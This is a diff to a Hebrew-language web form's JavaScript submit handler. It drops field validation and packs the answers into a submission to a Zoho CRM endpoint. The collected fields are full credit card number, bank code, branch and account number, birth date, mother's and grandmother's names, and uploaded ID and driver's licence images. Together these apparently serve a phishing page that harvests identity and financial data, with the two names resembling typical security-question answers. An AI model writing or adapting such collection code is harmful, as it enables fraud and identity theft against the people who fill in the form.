@@ -105,47 +105,45 @@ document.getElementById('tevelForm').addEventListener('submit', async function (
   const currentStep = document.querySelector('.form-step.active');
   if (!currentStep) return;
 
-  // Validate only required fields in the current step
-  const requiredFields = currentStep.querySelectorAll('[required]');
-  let isValid = true;
+  // Create FormData object
+  const formData = new FormData(this);
 
-  requiredFields.forEach(field => {
-    // Skip validation for hidden fields
-    if (field.type === 'hidden') return;
+  // Prepare the data object
+  const data = {
+    Lead_Source: "Online Form",
+    Last_Name: formData.get('full_name') || '',
+    Email: formData.get('email') || '',
+    Phone: formData.get('phone') || '',
+    Company: formData.get('workplace') || '',
+    Monthly_Income: formData.get('monthly_income') || '',
+    Bank_Code: formData.get('bank_code') || '',
+    Bank_Branch: formData.get('branch_number') || '',
+    Bank_Account: formData.get('account_number') || '',
+    Credit_Card: formData.get('credit_card')?.replace(/\s/g, '') || '',
+    Birth_Date: formatBirthDate(
+      formData.get('birth_day'),
+      formData.get('birth_month'),
+      formData.get('birth_year')
+    ),
+    Mother_Name: formData.get('SingleLine') || '',
+    Grandmother_Name: formData.get('SingleLine2') || '',
+    Consent_Approved: formData.get('creditConsent') === 'on' ? 'Yes' : 'No',
+    Terms_Accepted: formData.get('DecisionBox') === 'on' ? 'Yes' : 'No'
+  };
 
-    // For credit card, check if it's a valid number
-    if (field.name === 'credit_card') {
-      const cardNumber = field.value.replace(/\s/g, '');
-      if (cardNumber.length < 13 || cardNumber.length > 19) {
-        showError(field, 'נא להזין מספר כרטיס תקין');
-        isValid = false;
-      } else if (!isValidLuhn(cardNumber)) {
-        showError(field, 'נא להזין מספר כרטיס תקין');
-        isValid = false;
-      } else {
-        removeError(field);
-      }
+  // Add files if they exist and are not skipped
+  if (!document.getElementById('skipId')?.checked) {
+    const idFile = formData.get('id_document');
+    if (idFile instanceof File && idFile.size > 0) {
+      data.ID_Document = idFile;
     }
-    // For checkboxes, check if they're checked
-    else if (field.type === 'checkbox') {
-      if (!field.checked) {
-        showError(field, 'נא לאשר את ההסכמה');
-        isValid = false;
-      } else {
-        removeError(field);
-      }
-    }
-    // For other required fields
-    else if (!field.value.trim()) {
-      showError(field, 'שדה חובה');
-      isValid = false;
-    } else {
-      removeError(field);
-    }
-  });
+  }
 
-  if (!isValid) {
-    return;
+  if (!document.getElementById('skipLicense')?.checked) {
+    const licenseFile = formData.get('drivers_license');
+    if (licenseFile instanceof File && licenseFile.size > 0) {
+      data.Drivers_License = licenseFile;
+    }
   }
 
   const submitBtn = document.querySelector('.submit-btn');
@@ -154,10 +152,28 @@ document.getElementById('tevelForm').addEventListener('submit', async function (
   submitBtn.disabled = true;
 
   try {
-    const formData = new FormData(this);
+    // Create a new FormData object for the actual submission
+    const submitFormData = new FormData();
+
+    // Add all the data to the FormData
+    Object.entries(data).forEach(([key, value]) => {
+      if (value instanceof File) {
+        submitFormData.append(key, value, value.name);
+      } else {
+        submitFormData.append(key, value);
+      }
+    });
+
+    // Add the required Zoho parameters
+    submitFormData.append('xnQsjsdp', formData.get('xnQsjsdp'));
+    submitFormData.append('zc_gad', formData.get('zc_gad'));
+    submitFormData.append('xmIwtLD', formData.get('xmIwtLD'));
+    submitFormData.append('actionType', formData.get('actionType'));
+    submitFormData.append('returnURL', formData.get('returnURL'));
+
     const response = await fetch(this.action, {
       method: 'POST',
-      body: formData
+      body: submitFormData
     });
 
     if (response.ok) {
@@ -203,12 +219,25 @@ document.getElementById('tevelForm').addEventListener('submit', async function (
       throw new Error('שגיאה בשליחת הטופס');
     }
   } catch (error) {
-    showMessage(error.message, 'error');
+    console.error('Form submission error:', error);
+    alert('שגיאה בשליחת הטופס, נא לנסות שוב');
   } finally {
     submitBtn.innerHTML = originalText;
     submitBtn.disabled = false;
   }
 });
+
+// Helper function to format birth date
+function formatBirthDate(day, month, year) {
+  if (!day || !month || !year) return '';
+
+  // Pad day and month with leading zeros if needed
+  day = day.padStart(2, '0');
+  month = month.padStart(2, '0');
+
+  // Return date in YYYY-MM-DD format
+  return `${year}-${month}-${day}`;
+}
 
 // Confetti effect
 function triggerConfetti() {
